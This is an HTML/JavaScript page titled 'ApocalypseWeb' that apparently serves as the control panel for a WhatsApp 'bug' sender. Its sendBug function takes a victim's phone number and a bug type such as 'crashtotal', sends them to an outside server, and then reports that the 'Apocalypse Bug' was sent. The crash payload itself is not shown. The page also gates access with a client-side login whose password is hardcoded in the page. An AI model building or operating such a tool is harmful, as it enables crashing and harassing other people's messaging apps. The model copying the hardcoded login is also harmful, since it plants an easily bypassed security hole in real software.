<!DOCTYPE html>  
<html lang="en">  
<head>  
  <meta charset="UTF-8" />  
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>  
  <title>ApocalypseWeb</title>  
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">  
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">  
  <style>  
    body {
      margin: 0;
      padding: 0;
      font-family: 'Orbitron', sans-serif;
      background-image: url('https://files.catbox.moe/0vvfvq.jpg');
      background-size: cover;
      background-position: center;
      background-attachment: fixed;
      color: white;
    }

    .glass-box {
      background: rgba(0, 0, 0, 0.6);
      padding: 20px;
      border-radius: 10px;
      width: 300px;
      margin: 100px auto;
      text-align: center;
      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
    }

    input {
      display: block;
      width: 100%;
      margin: 10px 0;
      padding: 10px;
      border-radius: 5px;
      border: none;
    }

    button {
      padding: 10px 20px;
      background-color: #00ffcc;
      border: none;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    #particles-js {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: -1;
    }

    .popup-content {
      background: rgba(0,0,0,0.8);
      color: white;
      padding: 20px;
      border-radius: 10px;
    }

    #popup {
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      z-index: 999;
    }

    .close-btn {
      float: right;
      cursor: pointer;
      font-size: 24px;
      color: red;
    }

    footer {
      position: fixed;
      bottom: 10px;
      width: 100%;
      text-align: center;
      color: white;
      font-size: 14px;
    }
    
    /* Audio controls styling */
    #audio-controls {
      position: fixed;
      top: 10px;
      right: 10px;
      z-index: 1000;
      background: rgba(0,0,0,0.5);
      padding: 5px;
      border-radius: 5px;
    }
    
    #audio-controls button {
      background: none;
      border: none;
      color: white;
      cursor: pointer;
      font-size: 20px;
    }
  </style>
</head>  
<body>  
<!-- Audio element (hidden autoplay) -->
<audio id="bg-music" loop>
  <source src="https://files.catbox.moe/4m7x0x.mp3" type="audio/mpeg">
  Your browser does not support the audio element.
</audio>

<!-- Audio controls -->
<div id="audio-controls">
  <button id="toggle-audio" onclick="toggleAudio()">
    <i class="fas fa-volume-up"></i>
  </button>
</div>

<div id="particles-js"></div>  
<div id="popup" style="display:none;">  
  <div class="popup-content">  
    <span class="close-btn" onclick="closePopup()">&times;</span>  
    <p id="popup-message"></p>  
  </div>  
</div>  

<div id="login-box" class="glass-box">  
  <h1>Login</h1>  
  <input type="text" id="username" placeholder="Username" />  
  <input type="password" id="password" placeholder="Password" />  
  <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>  
  <div id="login-result" style="margin-top:10px; text-align:center;"></div>  
</div>  

<div class="glass-box" id="main-box" style="display:none;">  
  <!-- Konten dashboard tetap sama -->  
</div>  

<footer>  
  Contact Developer: <a href="https://t.me/RoviOfficialll" style="color:#00ffff;">t.me/RoviOfficialll</a>  
</footer>

<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>  
<script>  
// Audio control functions
function toggleAudio() {
  const audio = document.getElementById('bg-music');
  const toggleBtn = document.getElementById('toggle-audio');
  
  if (audio.paused) {
    audio.play();
    toggleBtn.innerHTML = '<i class="fas fa-volume-up"></i>';
  } else {
    audio.pause();
    toggleBtn.innerHTML = '<i class="fas fa-volume-mute"></i>';
  }
}

// Auto-play music when page loads (with user interaction requirement)
document.addEventListener('DOMContentLoaded', function() {
  const audio = document.getElementById('bg-music');
  audio.volume = 0.3; // Set volume to 30%
  
  // Try to autoplay (will work if browser allows)
  const playPromise = audio.play();
  
  if (playPromise !== undefined) {
    playPromise.catch(error => {
      // Autoplay was prevented, show UI to let user start playback
      console.log('Autoplay prevented, showing play button');
    });
  }
});

particlesJS("particles-js", {  
  particles: {
    number: { value: 100 },
    color: { value: "#ffffff" },
    shape: { type: "circle" },
    opacity: { value: 0.5 },
    size: { value: 3 },
    line_linked: {
      enable: true,
      distance: 150,
      color: "#ffffff",
      opacity: 0.4,
      width: 1
    },
    move: {
      enable: true,
      speed: 2,
      direction: "none",
      out_mode: "out"
    }
  },
  interactivity: {
    detect_on: "canvas",
    events: {
      onhover: { enable: true, mode: "repulse" },
      onclick: { enable: true, mode: "push" }
    },
    modes: {
      repulse: { distance: 100 },
      push: { particles_nb: 4 }
    }
  },
  retina_detect: true
});  
  
async function getUsers() {  
  return [{ username: "Rovi", password: "1101" }];
}  
  
function logout() {  
  sessionStorage.removeItem("currentUser");  
  location.reload();  
}  
  
function saveSession(user) {  
  sessionStorage.setItem("currentUser", JSON.stringify(user));  
}  
  
function getSession() {  
  return JSON.parse(sessionStorage.getItem("currentUser"));  
}  
  
window.onload = async () => {  
  const user = getSession();  
  if (user) showDashboard(user);  
};  
  
function showPopup(message) {  
  document.getElementById("popup-message").innerHTML = message;  
  document.getElementById("popup").style.display = "flex";  
}  
  
function closePopup() {  
  document.getElementById("popup").style.display = "none";  
}  
  
async function login() {  
  const user = document.getElementById("username").value.trim();  
  const pass = document.getElementById("password").value.trim();  
  const result = document.getElementById("login-result");  
  const users = await getUsers();  
  const found = users.find(u => u.username === user && u.password === pass);  
  
  if (found) {  
    saveSession(found);  
    showDashboard(found);  
  } else {  
    result.innerText = "❌ Username atau Password salah!";  
    result.style.color = "crimson";  
  }  
}  
  
function showDashboard(user) {  
  document.getElementById("login-box").style.display = "none";  
  document.getElementById("main-box").style.display = "block";  
  document.getElementById("userLabel").innerText = user.username;  
}  
  
let selectedBug = "crashtotal";  
document.querySelectorAll(".bug-card").forEach(card => {  
  card.addEventListener("click", () => {  
    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));  
    card.classList.add("active");  
    selectedBug = card.getAttribute("data-bug");  
  });  
});  
  
async function sendBug() {  
  const input = document.getElementById("target").value.trim();  
  const resDiv = document.getElementById("result");  
  const btn = document.getElementById("sendBtn");  
  
  if (!/^\d+(@s\.whatsapp\.net)?$/.test(input)) {  
    resDiv.innerText = "Masukkan nomor WA yang valid!";  
    resDiv.style.color = "crimson";  
    return;  
  }  
  
  const chatId = input.includes("@s.whatsapp.net") ? input : `${input}@s.whatsapp.net`;  
  btn.disabled = true;  
  const originalHTML = btn.innerHTML;  
  btn.innerHTML = '<span class="spinner"></span> Mengirim...';  
  resDiv.innerText = "";  
  
  try {  
    const res = await fetch(`https://cella-saja.mydigital-store.me/permen?chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`);  
    const json = await res.json();  
    showPopup(`Apocalypse Bug successfully sent to <b>${input}</b>`);  
  } catch (err) {  
    resDiv.innerText = "❌ Gagal fetch: " + err;  
    resDiv.style.color = "crimson";  
  }  
  
  btn.disabled = false;  
  btn.innerHTML = originalHTML;  
}  
</script>  
</body>  
</html>
